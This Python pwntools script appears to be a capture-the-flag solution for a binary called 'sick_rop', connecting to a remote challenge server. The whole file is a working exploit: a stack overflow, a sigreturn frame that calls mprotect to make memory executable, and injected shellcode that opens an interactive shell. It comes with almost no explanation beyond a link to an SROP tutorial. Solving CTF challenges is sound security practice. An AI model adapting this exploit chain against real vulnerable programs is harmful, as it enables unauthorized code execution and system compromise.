#!/usr/bin/env python3

from pwn import *

exe = ELF("./sick_rop")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.251.235", 30152)

    return r


def main():
    r = conn()

    sys_ret = 0x401014    # syscall; ret;
    ret     = 0x401016

    # SOP
    # https://0x00sec.org/t/srop-signals-you-say/2890

    frame = SigreturnFrame()
    frame.rax = 10              # mprotect syscode
    frame.rdi = 0x400000        # Memory segment to make writable
    frame.rsi = 0x4000          # Size
    frame.rdx = 7               # Read/Write/Exectable access
    frame.rsp = 0x4010d8        # Why not vuln function but a pointer to vuln?
    frame.rip = sys_ret         # Calling the syscall in the end

    payload = b"A" * 40 + p64(exe.symbols["vuln"]) + p64(sys_ret) + bytes(frame)
    
    r.send(payload)
    r.recv()

    r.send(b"A" * 15)
    r.recv()

    payload = b"\x90" * 40 + p64(0x4010e8) + asm(shellcraft.amd64.linux.sh())
    r.send(payload)

    sleep(1)
    r.clean()
    r.interactive("$ ")


if __name__ == "__main__":
    main()
